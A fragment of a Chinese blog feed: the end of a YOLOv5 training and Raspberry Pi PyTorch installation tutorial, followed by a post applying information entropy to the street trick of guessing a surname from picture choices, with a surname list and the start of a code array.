<h3 id="选择一个预训练模型"><a href="#选择一个预训练模型" class="headerlink" title="选择一个预训练模型"></a>选择一个预训练模型</h3><p>选择一个预训练模型开始训练。这里我们选择YOLOv5s，这是可用的最小和最快的模型。</p>
<p><img src="https://www.codekp.cn/download/img/标签/model_comparison.png" alt=""></p>
<h3 id="进行训练"><a href="#进行训练" class="headerlink" title="进行训练"></a>进行训练</h3><p><code>YOLOv5s 5 epochs $ python train.py --img 640 --batch 16 --epochs 5 --data dataset.yaml --weights yolov5s.pt</code></p>
<h3 id="训练结果"><a href="#训练结果" class="headerlink" title="训练结果"></a>训练结果</h3><p><img src="https://www.codekp.cn/download/img/标签/labels.jpg" alt=""><br><img src="https://www.codekp.cn/download/img/标签/labels_correlogram.jpg" alt=""><br><img src="https://www.codekp.cn/download/img/标签/results.jpg" alt=""><br><img src="https://www.codekp.cn/download/img/标签/test_batch2_labels.jpg" alt=""></p>
<h2 id="目标检测"><a href="#目标检测" class="headerlink" title="目标检测"></a>目标检测</h2><p>运行程序进行识别(将识别模型改成自己的进行使用)</p>
<pre class="line-numbers language-none"><code class="language-none">$ python detect.py --source 0  # webcam
                            file.jpg  # image 
                            file.mp4  # video
                            path&#x2F;  # directory
                            path&#x2F;*.jpg  # glob
                            &#39;https:&#x2F;&#x2F;youtu.be&#x2F;NUsoVlDFqZg&#39;  # YouTube video
                            &#39;rtsp:&#x2F;&#x2F;example.com&#x2F;media.mp4&#39;  # RTSP, RTMP, HTTP stream<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="训练coco模型可以"><a href="#训练coco模型可以" class="headerlink" title="训练coco模型可以"></a>训练coco模型可以</h3><pre class="line-numbers language-none"><code class="language-none">$ python train.py --data coco.yaml --cfg yolov5s.yaml --weights &#39;&#39; --batch-size 64
                                         yolov5m                                40
                                         yolov5l                                24
                                         yolov5x                                16
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="树莓派安装Berryconda-pytorch"><a href="#树莓派安装Berryconda-pytorch" class="headerlink" title="树莓派安装Berryconda+pytorch"></a>树莓派安装Berryconda+pytorch</h2><h3 id="安装conda-1"><a href="#安装conda-1" class="headerlink" title="安装conda"></a>安装conda</h3><h3 id="Berryconda"><a href="#Berryconda" class="headerlink" title="Berryconda"></a>Berryconda</h3><p>不建议安装Miniconda的armv7l二进制包，它的包都很久没有更新了。直接使用Berryconda，armv7l版本可以在rpi4上正常使用，下载并安装：</p>
<pre class="line-numbers language-none"><code class="language-none">wget https:&#x2F;&#x2F;github.com&#x2F;jjhelmus&#x2F;berryconda&#x2F;releases&#x2F;download&#x2F;v2.0.0&#x2F;Berryconda3-2.0.0-Linux-armv7l.sh
chmod a+x Berryconda3-2.0.0-Linux-armv7l.sh
.&#x2F;Berryconda3-2.0.0-Linux-armv7l.sh

安装结束后，python 和 conda 还不能正常使用，我们还需要配置 .bashrc 文件，我们打开 ~&#x2F;.bashrc，在配置文件最后添加以下语句：


export PATH&#x3D;&quot;&#x2F;home&#x2F;pi&#x2F;berryconda3:$PATH&quot;

配置完成后，我们将更新以下配置：

source ~&#x2F;.bashrc

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="miniconda"><a href="#miniconda" class="headerlink" title="miniconda"></a>miniconda</h3><pre class="line-numbers language-none"><code class="language-none">uname -a

&gt;&gt; Linux raspberrypi 4.19.118-v7l+ #1311 SMP Mon Apr 27 14:26:42 BST 2020 armv7l GNU&#x2F;Linux


wget http:&#x2F;&#x2F;repo.continuum.io&#x2F;miniconda&#x2F;Miniconda3-latest-Linux-armv7l.sh

sudo bash Miniconda3-latest-Linux-armv7l.sh

export PATH&#x3D;&quot;&#x2F;root&#x2F;miniconda3&#x2F;bin:$PATH&quot;

source ~&#x2F;.bashrc


conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;free&#x2F;


conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;main&#x2F;

conda config --set show_channel_urls yes


sudo chown pi:pi -R miniconda3
conda update conda
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="创建虚拟环境"><a href="#创建虚拟环境" class="headerlink" title="创建虚拟环境"></a>创建虚拟环境</h3><p><code>conda create -n pytorch python=3.8</code></p>
<h3 id="pytorch"><a href="#pytorch" class="headerlink" title="pytorch"></a>pytorch</h3><p>安装依赖</p>
<p><code>source activate pytorch</code></p>
<p><code>sudo apt-get install libopenblas-dev m4 libblas-dev cmake</code></p>
<p><code>conda install opencv numpy pyyaml cython</code></p>
<p><code>pip install numpy==1.16</code></p>
<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;pytorch&#x2F;pytorch.git
cd pytorch
git checkout v1.2.0
git submodule update --init --recursive
export NO_CUDA&#x3D;1
export NO_DISTRIBUTED&#x3D;1
export NO_MKLDNN&#x3D;1
export NO_TEST&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>目标检测</category>
      </categories>
      <tags>
        <tag>目标检测</tag>
      </tags>
  </entry>
  <entry>
    <title>信息论一个小实例</title>
    <url>/2020/10/23/%E2%80%9C%E4%B8%8D%E9%97%AE%EF%BC%8C%E7%9F%A5%E4%BD%A0%E5%90%8D%E2%80%9D%E7%9A%84%E7%8E%84%E5%AD%A6%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ssh-keygen -t rsa -C v@mmrsl.cn<br>ssh-keygen -t rsa -C kp@mmrsl.cn</p>
<h1 id="不用问知道你名字的玄学问题"><a href="#不用问知道你名字的玄学问题" class="headerlink" title="不用问知道你名字的玄学问题"></a><center>不用问知道你名字的玄学问题</center></h1><span id="more"></span>
<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>  不知道大家有没有遇到路边有人问你，不用问你的姓就能知道你姓什么，当然我也遇到了。我怕被要钱就没有问，但后来仔细寻思挺有趣的，到底是什么原理呢，很多人都在网上给出了自己的解释，但在我看来却没有完全解决我的疑惑。近期看信息论有感，感觉是很有智慧的信息编码技术。</p>
<h2 id="2-理论分析"><a href="#2-理论分析" class="headerlink" title="2.理论分析"></a>2.理论分析</h2><h3 id="2-1-信息论"><a href="#2-1-信息论" class="headerlink" title="2.1 信息论"></a>2.1 信息论</h3><p>  这个问题，看起来是一道玄学题，本质上其实是信息论问题。解决这个问题并不是我们的最终目的，我们应该通过这个简单的问题了解信息论的本质，以小见大，一通百通。<br>  信息论可以很好的给一个问题快速找到他的一个边界，每个信息所包含的信息量。最让人吃惊的是信息论的作者在上世纪中叶就给所有人类可以接触的所有信息问题设置了边界。人类遇到的全部都是经典问题，为这种问题设置了一个绝对的边界，无论你怎么设置也不能逾越的一个最大边界。任何人想要压缩数据、用一个事件发生去必然寻找另一个小概率事件所需要的数量等都已经被信息论所决定。<br>  当别人还在寻找问题的解决方案的时候，信息论可以让你迅速从理论角度找到答案，降维打击。让我们知道这个问题的极限在哪里，不需要做很多没意义的工作。<br>  所以我首先给大家介绍一下信息熵。</p>
<h3 id="2-2-信息熵"><a href="#2-2-信息熵" class="headerlink" title="2.2 信息熵"></a>2.2 信息熵</h3><blockquote>
<p>热力学的熵主要指的是：在一个孤立系统中没有外力做功的情况下，该系统的混乱程度（熵）会不断的增大。<br>信息论中的熵则指的是：信息的不确定程度</p>
</blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th>种类</th>
<th>区别</th>
</tr>
</thead>
<tbody>
<tr>
<td>热力学熵</td>
<td>系统的混乱程度</td>
</tr>
<tr>
<td>信息熵</td>
<td>信息的不确定度</td>
</tr>
</tbody>
</table>
</div>
<p>根据定义我们不难想到，一个信息的出现概率越小，这个信息的熵也就越大。那么举个例子：<br>两个人进行博弈，A和B这两个人如果势均力敌两者获胜的概率都是0.5，则这个两人无论谁获胜，获胜者的熵是:</p>
<script type="math/tex; mode=display">
H(x) =\sum_{i=1}^np_i(x)log_2(\frac 1 {p_i(x)})</script><p>b=2的时候单位是bits<br>上述例子的熵即可简单计算得到为$H(x) =\frac 1 2log_2(\frac 1 {\frac 1 2}))+\frac 1 2log_2(\frac 1 {\frac 1 2}))=1$</p>
<p>而如果两个人的概率并不相等，比如两个人打球一个是乔丹，一个是小白。那小白获胜的概率基本上是百万分之一，那么一旦小白获胜这个事件发生的信息熵是相当大的，也就是这个事件发生的信息论巨大。</p>
<p>因此综上所述：接下来的问题用信息论进行解决。</p>
<h3 id="2-3-百家姓的编码"><a href="#2-3-百家姓的编码" class="headerlink" title="2.3 百家姓的编码"></a>2.3 百家姓的编码</h3><p>有了信息熵的基础，我们现在就可以很容易的将中国500多个姓进行编码，那么就可以很用以的从图片是否有你的姓名这个信息很容易，找到你自己的姓。</p>
<blockquote>
<p>姓名: {“赵”,”钱”,”孙”,”李”,”周”,”吴”,”郑”,”王”,”冯”,”陈”,”褚”,”卫”,”蒋”,”沈”,”韩”,”杨”,”朱”,”秦”,”尤”,”许”,”何”,”吕”,”施”,”张”,”孔”,”曹”,”严”,”华”,”金”,”魏”,”陶”,”姜”,”戚”,”谢”,”邹”,”喻”,”柏”,”水”,”窦”,”章”,”云”,”苏”,”潘”,”葛”,”奚”,”范”,”彭”,”郎”,”鲁”,”韦”,”昌”,”马”,”苗”,”凤”,”花”,”方”,”俞”,”任”,”袁”,”柳”,”酆”,”鲍”,”史”,”唐”,”费”,”廉”,”岑”,”薛”,”雷”,”贺”,”倪”,”汤”,”滕”,”殷”,”罗”,”毕”,”郝”,”邬”,”安”,”常”,”乐”,”于”,”时”,”傅”,”皮”,”卞”,”齐”,”康”,”伍”,”余”,”元”,”卜”,”顾”,”孟”,”平”,”黄”,”和”,”穆”,”萧”,”尹”,”姚”,”邵”,”湛”,”汪”,”祁”,”毛”,”禹”,”狄”,”米”,”贝”,”明”,”臧”,”计”,”伏”,”成”,”戴”,”谈”,”宋”,”茅”,”庞”,”熊”,”纪”,”舒”,”屈”,”项”,”祝”,”董”,”梁”,”杜”,”阮”,”蓝”,”闵”,”席”,”季”,”麻”,”强”,”贾”,”路”,”娄”,”危”,”江”,”童”,”颜”,”郭”,”梅”,”盛”,”林”,”刁”,”钟”,”徐”,”邱”,”骆”,”高”,”夏”,”蔡”,”田”,”樊”,”胡”,”凌”,”霍”,”虞”,”万”,”支”,”柯”,”昝”,”管”,”卢”,”莫”,”经”,”房”,”裘”,”缪”,”干”,”解”,”应”,”宗”,”丁”,”宣”,”贲”,”邓”,”郁”,”单”,”杭”,”洪”,”包”,”诸”,”左”,”石”,”崔”,”吉”,”钮”,”龚”,”程”,”嵇”,”邢”,”滑”,”裴”,”陆”,”荣”,”翁”,”荀”,”羊”,”於”,”惠”,”甄”,”麴”,”家”,”封”,”芮”,”羿”,”储”,”靳”,”汲”,”邴”,”糜”,”松”,”井”,”段”,”富”,”巫”,”乌”,”焦”,”巴”,”弓”,”牧”,”隗”,”山”,”谷”,”车”,”侯”,”宓”,”蓬”,”全”,”郗”,”班”,”仰”,”秋”,”仲”,”伊”,”宫”,”宁”,”仇”,”栾”,”暴”,”甘”,”钭”,”厉”,”戎”,”祖”,”武”,”符”,”刘”,”景”,”詹”,”束”,”龙”,”叶”,”幸”,”司”,”韶”,”郜”,”黎”,”蓟”,”薄”,”印”,”宿”,”白”,”怀”,”蒲”,”邰”,”从”,”鄂”,”索”,”咸”,”籍”,”赖”,”卓”,”蔺”,”屠”,”蒙”,”池”,”乔”,”阴”,”欎”,”胥”,”能”,”苍”,”双”,”闻”,”莘”,”党”,”翟”,”谭”,”贡”,”劳”,”逄”,”姬”,”申”,”扶”,”堵”,”冉”,”宰”,”郦”,”雍”,”舄”,”璩”,”桑”,”桂”,”濮”,”牛”,”寿”,”通”,”边”,”扈”,”燕”,”冀”,”郏”,”浦”,”尚”,”农”,”温”,”别”,”庄”,”晏”,”柴”,”瞿”,”阎”,”充”,”慕”,”连”,”茹”,”习”,”宦”,”艾”,”鱼”,”容”,”向”,”古”,”易”,”慎”,”戈”,”廖”,”庾”,”终”,”暨”,”居”,”衡”,”步”,”都”,”耿”,”满”,”弘”,”匡”,”国”,”文”,”寇”,”广”,”禄”,”阙”,”东”,”殴”,”殳”,”沃”,”利”,”蔚”,”越”,”夔”,”隆”,”师”,”巩”,”厍”,”聂”,”晁”,”勾”,”敖”,”融”,”冷”,”訾”,”辛”,”阚”,”那”,”简”,”饶”,”空”,”曾”,”毋”,”沙”,”乜”,”养”,”鞠”,”须”,”丰”,”巢”,”关”,”蒯”,”相”,”查”,”後”,”荆”,”红”,”游”,”竺”,”权”,”逯”,”盖”,”益”,”桓”,”公”,”万俟”,”司马”,”上官”,”欧阳”,”夏侯”,”诸葛”,”闻人”,”东方”,”赫连”,”皇甫”,”尉迟”,”公羊”,”澹台”,”公冶”,”宗政”,”濮阳”,”淳于”,”单于”,”太叔”,”申屠”,”公孙”,”仲孙”,”轩辕”,”令狐”,”钟离”,”宇文”,”长孙”,”慕容”,”鲜于”,”闾丘”,”司徒”,”司空”,”亓官”,”司寇”,”仉”,”督”,”子车”,”颛孙”,”端木”,”巫马”,”公西”,”漆雕”,”乐正”,”壤驷”,”公良”,”拓跋”,”夹谷”,”宰父”,”谷梁”,”晋”,”楚”,”闫”,”法”,”汝”,”鄢”,”涂”,”钦”,”段干”,”百里”,”东郭”,”南门”,”呼延”,”归”,”海”,”羊舌”,”微生”,”岳”,”帅”,”缑”,”亢”,”况”,”后”,”有”,”琴”,”梁丘”,”左丘”,”东门”,”西门”,”商”,”牟”,”佘”,”佴”,”伯”,”赏”,”南宫”,”墨”,”哈”,”谯”,”笪”,”年”,”爱”,”阳”,”佟”,”第五”,”言”,”福”}<br> 源自:<a href="https://zhidao.baidu.com/question/213833749.html">百度知道-百家姓</a>.<br>可以找到比如从里面找到”万”这个姓的概率是$P_{“万”}(x)=\frac 1 {500}$.<br>那么你正好选中这个字的信息熵就等于$H(x)=log(\frac 1{500})\approx8.96$</p>
<h4 id="2-3-1方式的选择"><a href="#2-3-1方式的选择" class="headerlink" title="2.3.1方式的选择"></a>2.3.1方式的选择</h4><p>1、让人只能选择一张图片里面可以选择出来他的姓，根据信息论可以知道直选一次需要至少在500个字中选择。<br>由此可见，咱们不可能用500多张图去考一个人，而且这一点也不玄学。<br>2、我们采用两次选择图片则我们可以有以下计算：<br>由于上诉我们已经知道找到万这个姓的信息熵是8.96<br>那么如果选两张图片里面可能有万这个姓的信息熵至少要达到4.48<br>那么至少需要$2^{4.48}=22.3$张图片，及两个22进制的选择提供给被测试者选择，大概就是从44张图片中选两张。<br>3、三次选择呢我们可以有以下计算：<br>由于上诉我们已经知道找到万这个姓的信息熵是8.96<br>那么如果选三张图片里面可能有万这个姓的信息熵至少要达到2.98<br>那么至少需要$2^{2.98}=7.8$张图片，及3个8张图的选择提供给被测试者选择，大概就是从24张图片中选三张。这就给选择者降低了很多难度<br>4、四次选择呢我们可以有以下计算：<br>由于上诉我们已经知道找到万这个姓的信息熵是8.96<br>那么如果选三张图片里面可能有万这个姓的信息熵至少要达到2.24<br>那么至少需要$2^{2.98}=4.72$张图片，及3个5张图的选择提供给被测试者选择，大概就是从15张图片中选四张。这就给选择者更加降低了难度<br>5、同理咱么可以不断的增加选择次数可以选择9次<br>那么我们信息熵就可以是2张图选择9次：18张图选9张</p>
</blockquote>
<p>但是大家可能会困惑，那么为什么不采用更多的选择次数：<br>首先：选择次数为9时，每次选择图片的时候你需要从200多个里面选一个。<br>其次：当你选了3-4次在我看来是最好的，每次选择的字不会太多大概是32-64个里面选一个降低了选择难度，其次你给的信息少，更能够让你感觉到不可思议。</p>
<p>因此接下来我选择3次8选1，从中选择你的姓，你们可以选择其他方法进行实现。</p>
<h2 id="3-程序设计"><a href="#3-程序设计" class="headerlink" title="3. 程序设计"></a>3. 程序设计</h2><p>读者可以参考本文代码，将百家姓进行编码，通过程序咱们可以找到你的姓名。(3x8)<br><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">
clear<span class="token punctuation">;</span>
Book_of_Family_Names <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"赵"</span><span class="token punctuation">,</span><span class="token string">"钱"</span><span class="token punctuation">,</span><span class="token string">"孙"</span><span class="token punctuation">,</span><span class="token string">"李"</span><span class="token punctuation">,</span><span class="token string">"周"</span><span class="token punctuation">,</span><span class="token string">"吴"</span><span class="token punctuation">,</span><span class="token string">"郑"</span><span class="token punctuation">,</span><span class="token string">"王"</span><span class="token punctuation">,</span><span class="token string">"冯"</span><span class="token punctuation">,</span><span class="token string">"陈"</span><span class="token punctuation">,</span><span class="token string">"褚"</span><span class="token punctuation">,</span><span class="token string">"卫"</span><span class="token punctuation">,</span><span class="token string">"蒋"</span><span class="token punctuation">,</span><span class="token string">"沈"</span><span class="token punctuation">,</span><span class="token string">"韩"</span><span class="token punctuation">,</span><span class="token string">"杨"</span><span class="token punctuation">,</span><span class="token string">"朱"</span><span class="token punctuation">,</span><span class="token string">"秦"</span><span class="token punctuation">,</span><span class="token string">"尤"</span><span class="token punctuation">,</span><span class="token string">"许"</span><span class="token punctuation">,</span><span class="token string">"何"</span><span class="token punctuation">,</span><span class="token string">"吕"</span><span class="token punctuation">,</span><span class="token string">"施"</span><span class="token punctuation">,</span><span class="token string">"张"</span><span class="token punctuation">,</span><span class="token string">"孔"</span><span class="token punctuation">,</span><span class="token string">"曹"</span><span class="token punctuation">,</span><span class="token string">"严"</span><span class="token punctuation">,</span><span class="token string">"华"</span><span class="token punctuation">,</span><span class="token string">"金"</span><span class="token punctuation">,</span><span class="token string">"魏"</span><span class="token punctuation">,</span><span class="token string">"陶"</span><span class="token punctuation">,</span><span class="token string">"姜"</span><span class="token punctuation">,</span><span class="token string">"戚"</span><span class="token punctuation">,</span><span class="token string">"谢"</span><span class="token punctuation">,</span><span class="token string">"邹"</span><span class="token punctuation">,</span><span class="token string">"喻"</span><span class="token punctuation">,</span><span class="token string">"柏"</span><span class="token punctuation">,</span><span class="token string">"水"</span><span class="token punctuation">,</span><span class="token string">"窦"</span><span class="token punctuation">,</span><span class="token string">"章"</span><span class="token punctuation">,</span><span class="token string">"云"</span><span class="token punctuation">,</span><span class="token string">"苏"</span><span class="token punctuation">,</span><span class="token string">"潘"</span><span class="token punctuation">,</span><span class="token string">"葛"</span><span class="token punctuation">,</span><span class="token string">"奚"</span><span class="token punctuation">,</span><span class="token string">"范"</span><span class="token punctuation">,</span><span class="token string">"彭"</span><span class="token punctuation">,</span><span class="token string">"郎"</span><span class="token punctuation">,</span><span class="token string">"鲁"</span><span class="token punctuation">,</span><span class="token string">"韦"</span><span class="token punctuation">,</span><span class="token string">"昌"</span><span class="token punctuation">,</span><span class="token string">"马"</span><span class="token punctuation">,</span><span class="token string">"苗"</span><span class="token punctuation">,</span><span class="token string">"凤"</span><span class="token punctuation">,</span><span class="token string">"花"</span><span class="token punctuation">,</span><span class="token string">"方"</span><span class="token punctuation">,</span><span class="token string">"俞"</span><span class="token punctuation">,</span><span class="token string">"任"</span><span class="token punctuation">,</span><span class="token string">"袁"</span><span class="token punctuation">,</span><span class="token string">"柳"</span><span class="token punctuation">,</span><span class="token string">"酆"</span><span class="token punctuation">,</span><span class="token string">"鲍"</span><span class="token punctuation">,</span><span class="token string">"史"</span><span class="token punctuation">,</span><span class="token string">"唐"</span><span class="token punctuation">,</span><span class="token string">"费"</span><span class="token punctuation">,</span><span class="token string">"廉"</span><span class="token punctuation">,</span><span class="token string">"岑"</span><span class="token punctuation">,</span><span class="token string">"薛"</span><span class="token punctuation">,</span><span class="token string">"雷"</span><span class="token punctuation">,</span><span class="token string">"贺"</span><span class="token punctuation">,</span><span class="token string">"倪"</span><span class="token punctuation">,</span><span class="token string">"汤"</span><span class="token punctuation">,</span><span class="token string">"滕"</span><span class="token punctuation">,</span><span class="token string">"殷"</span><span class="token punctuation">,</span><span class="token string">"罗"</span><span class="token punctuation">,</span><span class="token string">"毕"</span><span class="token punctuation">,</span><span class="token string">"郝"</span><span class="token punctuation">,</span><span class="token string">"邬"</span><span class="token punctuation">,</span><span class="token string">"安"</span><span class="token punctuation">,</span><span class="token string">"常"</span><span class="token punctuation">,</span><span class="token string">"乐"</span><span class="token punctuation">,</span><span class="token string">"于"</span><span class="token punctuation">,</span><span class="token string">"时"</span><span class="token punctuation">,</span><span class="token string">"傅"</span><span class="token punctuation">,</span><span class="token string">"皮"</span><span class="token punctuation">,</span><span class="token string">"卞"</span><span class="token punctuation">,</span><span class="token string">"齐"</span><span class="token punctuation">,</span><span class="token string">"康"</span><span class="token punctuation">,</span><span class="token string">"伍"</span><span class="token punctuation">,</span><span class="token string">"余"</span><span class="token punctuation">,</span><span class="token string">"元"</span><span class="token punctuation">,</span><span class="token string">"卜"</span><span class="token punctuation">,</span><span class="token string">"顾"</span><span class="token punctuation">,</span><span class="token string">"孟"</span><span class="token punctuation">,</span><span class="token string">"平"</span><span class="token punctuation">,</span><span class="token string">"黄"</span><span class="token punctuation">,</span><span class="token string">"和"</span><span class="token punctuation">,</span><span class="token string">"穆"</span><span class="token punctuation">,</span><span class="token string">"萧"</span><span class="token punctuation">,</span><span class="token string">"尹"</span><span class="token punctuation">,</span><span class="token string">"姚"</span><span class="token punctuation">,</span><span class="token string">"邵"</span><span class="token punctuation">,</span><span class="token string">"湛"</span><span class="token punctuation">,</span><span class="token string">"汪"</span><span class="token punctuation">,</span><span class="token string">"祁"</span><span class="token punctuation">,</span><span class="token string">"毛"</span><span class="token punctuation">,</span><span class="token string">"禹"</span><span class="token punctuation">,</span><span class="token string">"狄"</span><span class="token punctuation">,</span><span class="token string">"米"</span><span class="token punctuation">,</span><span class="token string">"贝"</span><span class="token punctuation">,</span><span class="token string">"明"</span><span class="token punctuation">,</span><span class="token string">"臧"</span><span class="token punctuation">,</span><span class="token string">"计"</span><span class="token punctuation">,</span><span class="token string">"伏"</span><span class="token punctuation">,</span><span class="token string">"成"</span><span class="token punctuation">,</span><span class="token string">"戴"</span><span class="token punctuation">,</span><span class="token string">"谈"</span><span class="token punctuation">,</span><span class="token string">"宋"</span><span class="token punctuation">,</span><span class="token string">"茅"</span><span class="token punctuation">,</span><span class="token string">"庞"</span><span class="token punctuation">,</span><span class="token string">"熊"</span><span class="token punctuation">,</span><span class="token string">"纪"</span><span class="token punctuation">,</span><span class="token string">"舒"</span><span class="token punctuation">,</span><span class="token string">"屈"</span><span class="token punctuation">,</span><span class="token string">"项"</span><span class="token punctuation">,</span><span class="token string">"祝"</span><span class="token punctuation">,</span><span class="token string">"董"</span><span class="token punctuation">,</span><span class="token string">"梁"</span><span class="token punctuation">,</span><span class="token string">"杜"</span><span class="token punctuation">,</span><span class="token string">"阮"</span><span class="token punctuation">,</span><span class="token string">"蓝"</span><span class="token punctuation">,</span><span class="token string">"闵"</span><span class="token punctuation">,</span><span class="token string">"席"</span><span class="token punctuation">,</span><span class="token string">"季"</span><span class="token punctuation">,</span><span class="token string">"麻"</span><span class="token punctuation">,</span><span class="token string">"强"</span><span class="token punctuation">,</span><span class="token string">"贾"</span><span class="token punctuation">,</span><span class="token string">"路"</span><span class="token punctuation">,</span><span class="token string">"娄"</span><span class="token punctuation">,</span><span class="token string">"危"</span><span class="token punctuation">,</span><span class="token string">"江"</span><span class="token punctuation">,</span><span class="token string">"童"</span><span class="token punctuation">,</span><span class="token string">"颜"</span><span class="token punctuation">,</span><span class="token string">"郭"</span><span class="token punctuation">,</span><span class="token string">"梅"</span><span class="token punctuation">,</span><span class="token string">"盛"</span><span class="token punctuation">,</span><span class="token string">"林"</span><span class="token punctuation">,</span><span class="token string">"刁"</span><span class="token punctuation">,</span><span class="token string">"钟"</span><span class="token punctuation">,</span><span class="token string">"徐"</span><span class="token punctuation">,</span><span class="token string">"邱"</span><span class="token punctuation">,</span><span class="token string">"骆"</span><span class="token punctuation">,</span><span class="token string">"高"</span><span class="token punctuation">,</span><span class="token string">"夏"</span><span class="token punctuation">,</span><span class="token string">"蔡"</span><span class="token punctuation">,</span><span class="token string">"田"</span><span class="token punctuation">,</span><span class="token string">"樊"</span><span class="token punctuation">,</span><span class="token string">"胡"</span><span class="token punctuation">,</span><span class="token string">"凌"</span><span class="token punctuation">,</span><span class="token string">"霍"</span><span class="token punctuation">,</span><span class="token string">"虞"</span><span class="token punctuation">,</span><span class="token string">"万"</span><span class="token punctuation">,</span><span class="token string">"支"</span><span class="token punctuation">,</span><span class="token string">"柯"</span><span class="token punctuation">,</span><span class="token string">"昝"</span><span class="token punctuation">,</span><span class="token string">"管"</span><span class="token punctuation">,</span><span class="token string">"卢"</span><span class="token punctuation">,</span><span class="token string">"莫"</span><span class="token punctuation">,</span><span class="token string">"经"</span><span class="token punctuation">,</span><span class="token string">"房"</span><span class="token punctuation">,</span><span class="token string">"裘"</span><span class="token punctuation">,</span><span class="token string">"缪"</span><span class="token punctuation">,</span><span class="token string">"干"</span><span class="token punctuation">,</span><span class="token string">"解"</span><span class="token punctuation">,</span><span class="token string">"应"</span><span class="token punctuation">,</span><span class="token string">"宗"</span><span class="token punctuation">,</span><span class="token string">"丁"</span><span class="token punctuation">,</span><span class="token string">"宣"</span><span class="token punctuation">,</span><span class="token string">"贲"</span><span class="token punctuation">,</span><span class="token string">"邓"</span><span class="token punctuation">,</span><span class="token string">"郁"</span><span class="token punctuation">,</span><span class="token string">"单"</span><span class="token punctuation">,</span><span class="token string">"杭"</span><span class="token punctuation">,</span><span class="token string">"洪"</span><span class="token punctuation">,</span><span class="token string">"包"</span><span class="token punctuation">,</span><span class="token string">"诸"</span><span class="token punctuation">,</span><span class="token string">"左"</span><span class="token punctuation">,</span><span class="token string">"石"</span><span class="token punctuation">,</span><span class="token string">"崔"</span><span class="token punctuation">,</span><span class="token string">"吉"</span><span class="token punctuation">,</span><span class="token string">"钮"</span><span class="token punctuation">,</span><span class="token string">"龚"</span><span class="token punctuation">,</span><span class="token string">"程"</span><span class="token punctuation">,</span><span class="token string">"嵇"</span><span class="token punctuation">,</span><span class="token string">"邢"</span><span class="token punctuation">,</span><span class="token string">"滑"</span><span class="token punctuation">,</span><span class="token string">"裴"</span><span class="token punctuation">,</span><span class="token string">"陆"</span><span class="token punctuation">,</span><span class="token string">"荣"</span><span class="token punctuation">,</span><span class="token string">"翁"</span><span class="token punctuation">,</span><span class="token string">"荀"</span><span class="token punctuation">,</span><span class="token string">"羊"</span><span class="token punctuation">,</span><span class="token string">"於"</span><span class="token punctuation">,</span><span class="token string">"惠"</span><span class="token punctuation">,</span><span class="token string">"甄"</span><span class="token punctuation">,</span><span class="token string">"麴"</span><span class="token punctuation">,</span><span class="token string">"家"</span><span class="token punctuation">,</span><span class="token string">"封"</span><span class="token punctuation">,</span><span class="token string">"芮"</span><span class="token punctuation">,</span><span class="token string">"羿"</span><span class="token punctuation">,</span><span class="token string">"储"</span><span class="token punctuation">,</span><span class="token string">"靳"</span><span class="token punctuation">,</span><span class="token string">"汲"</span><span class="token punctuation">,</span><span class="token string">"邴"</span><span class="token punctuation">,</span><span class="token string">"糜"</span><span class="token punctuation">,</span><span class="token string">"松"</span><span class="token punctuation">,</span><span class="token string">"井"</span><span class="token punctuation">,</span><span class="token string">"段"</span><span class="token punctuation">,</span><span class="token string">"富"</span><span class="token punctuation">,</span><span class="token string">"巫"</span><span class="token punctuation">,</span><span class="token string">"乌"</span><span class="token punctuation">,</span><span class="token string">"焦"</span><span class="token punctuation">,</span><span class="token string">"巴"</span><span class="token punctuation">,</span><span class="token string">"弓"</span><span class="token punctuation">,</span><span class="token string">"牧"</span><span class="token punctuation">,</span><span class="token string">"隗"</span><span class="token punctuation">,</span><span class="token string">"山"</span><span class="token punctuation">,</span><span class="token string">"谷"</span><span class="token punctuation">,</span><span class="token string">"车"</span><span class="token punctuation">,</span><span class="token string">"侯"</span><span class="token punctuation">,</span><span class="token string">"宓"</span><span class="token punctuation">,</span><span class="token string">"蓬"</span><span class="token punctuation">,</span><span class="token string">"全"</span><span class="token punctuation">,</span><span class="token string">"郗"</span><span class="token punctuation">,</span><span class="token string">"班"</span><span class="token punctuation">,</span><span class="token string">"仰"</span><span class="token punctuation">,</span><span class="token string">"秋"</span><span class="token punctuation">,</span><span class="token string">"仲"</span><span class="token punctuation">,</span><span class="token string">"伊"</span><span class="token punctuation">,</span><span class="token string">"宫"</span><span class="token punctuation">,</span><span class="token string">"宁"</span><span class="token punctuation">,</span><span class="token string">"仇"</span><span class="token punctuation">,</span><span class="token string">"栾"</span><span class="token punctuation">,</span><span class="token string">"暴"</span><span class="token punctuation">,</span><span class="token string">"甘"</span><span class="token punctuation">,</span><span class="token string">"钭"</span><span class="token punctuation">,</span><span class="token string">"厉"</span><span class="token punctuation">,</span><span class="token string">"戎"</span><span class="token punctuation">,</span><span class="token string">"祖"</span><span class="token punctuation">,</span><span class="token string">"武"</span><span class="token punctuation">,</span><span class="token string">"符"</span><span class="token punctuation">,</span><span class="token string">"刘"</span><span class="token punctuation">,</span><span class="token string">"景"</span><span class="token punctuation">,</span><span 